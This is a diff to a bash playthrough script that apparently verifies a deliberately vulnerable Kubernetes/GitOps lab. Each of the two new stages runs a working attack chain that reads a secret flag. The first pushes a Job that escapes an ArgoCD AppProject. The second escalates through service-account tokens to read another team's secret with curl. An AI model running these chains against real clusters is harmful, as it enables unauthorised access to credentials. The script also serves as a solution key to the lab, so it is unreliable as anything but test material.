@@ -95,6 +95,80 @@ EOF
   chk tf_6 tf_6-k8s-rbac-backdoor "$out"
 fi
 
+echo "### GitOps / Kubernetes kill-chains ###"
+
+# --- k8s_1: ArgoCD AppProject escape -> deploy a Job into the restricted platform namespace ----
+if enabled k8s_1; then
+  W=$(mktemp -d)
+  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
+  cat > "$W/app/deploy/escape.yaml" <<'YML'
+apiVersion: batch/v1
+kind: Job
+metadata: { name: exfil, namespace: platform }
+spec:
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: x
+        image: busybox:1.36
+        command: ["sh","-c","echo FOUND=$CROWN"]
+        env:
+        - name: CROWN
+          valueFrom: { secretKeyRef: { name: crown, key: flag } }
+YML
+  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
+    && { git -c user.email=atk@x -c user.name=atk commit -q -m "add monitor job" || true; } \
+    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+k3s kubectl -n platform delete job exfil --ignore-not-found >/dev/null 2>&1
+k3s kubectl -n argocd annotate app alpha-app argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1
+for i in $(seq 1 40); do k3s kubectl -n platform get job exfil >/dev/null 2>&1 && break; sleep 3; done
+for i in $(seq 1 25); do
+  p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
+  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break
+  sleep 3
+done
+p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
+[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
+EOF
+)
+  chk k8s_1 k8s_1-argo-project-escape "$out"
+fi
+
+# --- k8s_2: pipeline SA -> create pod as a parked cluster-admin SA -> cross-team secret ----
+if enabled k8s_2; then
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+TOK=$(k3s kubectl -n alpha create token alpha-ci)
+KA="k3s kubectl --server=https://127.0.0.1:6443 --insecure-skip-tls-verify --token=$TOK"
+k3s kubectl -n alpha delete pod esc --ignore-not-found >/dev/null 2>&1
+cat <<'POD' | $KA -n alpha apply -f - >/dev/null 2>&1
+apiVersion: v1
+kind: Pod
+metadata: { name: esc }
+spec:
+  serviceAccountName: alpha-deploy
+  restartPolicy: Never
+  containers:
+  - name: x
+    image: curlimages/curl:8.10.1
+    command: ["sh","-c","T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \"Authorization: Bearer $T\" https://kubernetes.default.svc/api/v1/namespaces/beta/secrets/rbac-crown"]
+POD
+for i in $(seq 1 30); do
+  ph=$(k3s kubectl -n alpha get pod esc -o jsonpath='{.status.phase}' 2>/dev/null)
+  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
+done
+sleep 4
+k3s kubectl -n alpha logs esc 2>/dev/null | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
+EOF
+)
+  chk k8s_2 k8s_2-rbac-escalation "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
